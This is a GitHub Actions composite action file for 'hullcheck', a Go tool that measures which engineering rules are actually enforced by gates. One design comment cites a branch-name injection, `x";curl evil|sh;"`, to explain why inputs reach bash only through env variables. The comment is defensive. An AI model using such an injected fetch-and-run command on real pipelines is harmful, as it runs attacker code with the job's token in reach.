name: hullcheck
description: >-
  Report which of your stated engineering rules are actually enforced by
  something that runs, and how long a violation survives before it is caught.
author: Spaceship Alpha 9
branding:
  icon: shield
  color: purple

inputs:
  path:
    description: Directory to read.
    required: false
    default: "."
  fail-under:
    description: >-
      Fail the job if gate coverage is below this percentage. Leave empty to
      report without failing - the usual way to start.
    required: false
    default: ""
  weighted:
    description: Judge fail-under against severity-weighted coverage.
    required: false
    default: "false"
  verify:
    description: >-
      Prove each declared gate fails when its rule is broken. Needs a
      .hullcheck.yml, and runs the gate commands it declares.
    required: false
    default: "false"
  since:
    description: Report how coverage moved from this git ref to now.
    required: false
    default: ""
  diff-base:
    description: >-
      Fail on rules newly unenforced since this ref. Pre-existing gaps do not
      fail the job.
    required: false
    default: ""
  format:
    description: "text, json, or markdown."
    required: false
    default: "text"
  summary:
    description: Write the reading to the GitHub step summary.
    required: false
    default: "true"

outputs:
  coverage:
    description: Gate coverage as a percentage.
    value: ${{ steps.read.outputs.coverage }}
  weighted-coverage:
    description: Severity-weighted gate coverage as a percentage.
    value: ${{ steps.read.outputs.weighted }}
  breaches:
    description: Number of stated rules that nothing enforces.
    value: ${{ steps.read.outputs.breaches }}

# Composite, not a container action. A container action would need Docker on the
# runner and a published image; this needs only the Go toolchain, which means it
# works from the first commit with nothing published anywhere.
#
# No `${{ }}` expression is ever written into a `run:` script. Inputs reach bash
# through env: only, so they arrive as data. Interpolated, an input such as
# `diff-base: ${{ github.head_ref }}` ran a branch name like `x";curl evil|sh;"`
# as shell, with the job's token in reach.
runs:
  using: composite
  steps:
    - uses: actions/setup-go@v5
      with:
        go-version: "1.26"
        cache: false

    - id: build
      shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
      run: |
        set -euo pipefail
        go build -C "$ACTION_PATH" -o "${RUNNER_TEMP}/hullcheck" ./cmd/hullcheck
        echo "bin=${RUNNER_TEMP}/hullcheck" >> "$GITHUB_OUTPUT"

    # Read the numbers first, without any threshold, so the outputs are populated
    # even when the gating step below fails the job.
    - id: read
      shell: bash
      env:
        BIN: ${{ steps.build.outputs.bin }}
        HC_PATH: ${{ inputs.path }}
      run: |
        set -uo pipefail
        json="$("$BIN" --no-banner --json -- "$HC_PATH" || true)"
        get() { printf '%s' "$json" | tr -d ' \n' | grep -o "\"$1\":[0-9.]*" | head -1 | cut -d: -f2; }
        echo "coverage=$(get gate_coverage || echo 0)" >> "$GITHUB_OUTPUT"
        echo "weighted=$(get weighted_gate_coverage || echo 0)" >> "$GITHUB_OUTPUT"
        echo "breaches=$(printf '%s' "$json" | grep -c '"verdict": *"BREACH"' || true)" >> "$GITHUB_OUTPUT"

    - id: summary
      if: inputs.summary == 'true'
      shell: bash
      env:
        BIN: ${{ steps.build.outputs.bin }}
        HC_PATH: ${{ inputs.path }}
      run: |
        set -uo pipefail
        "$BIN" --no-banner --markdown -- "$HC_PATH" >> "$GITHUB_STEP_SUMMARY" || true

    - id: run
      shell: bash
      env:
        BIN: ${{ steps.build.outputs.bin }}
        HC_PATH: ${{ inputs.path }}
        HC_DIFF_BASE: ${{ inputs.diff-base }}
        HC_FORMAT: ${{ inputs.format }}
        HC_SINCE: ${{ inputs.since }}
        HC_VERIFY: ${{ inputs.verify }}
        HC_WEIGHTED: ${{ inputs.weighted }}
        HC_FAIL_UNDER: ${{ inputs.fail-under }}
      run: |
        set -euo pipefail

        if [ -n "$HC_DIFF_BASE" ]; then
          exec "$BIN" diff --base "$HC_DIFF_BASE" -- "$HC_PATH"
        fi

        args=(--no-banner)
        [ "$HC_FORMAT" = "json" ] && args+=(--json)
        [ "$HC_FORMAT" = "markdown" ] && args+=(--markdown)
        [ -n "$HC_SINCE" ] && args+=(--since "$HC_SINCE")
        [ "$HC_VERIFY" = "true" ] && args+=(--verify)
        [ "$HC_WEIGHTED" = "true" ] && args+=(--weighted)
        [ -n "$HC_FAIL_UNDER" ] && args+=(--fail-under "$HC_FAIL_UNDER")

        exec "$BIN" "${args[@]}" -- "$HC_PATH"
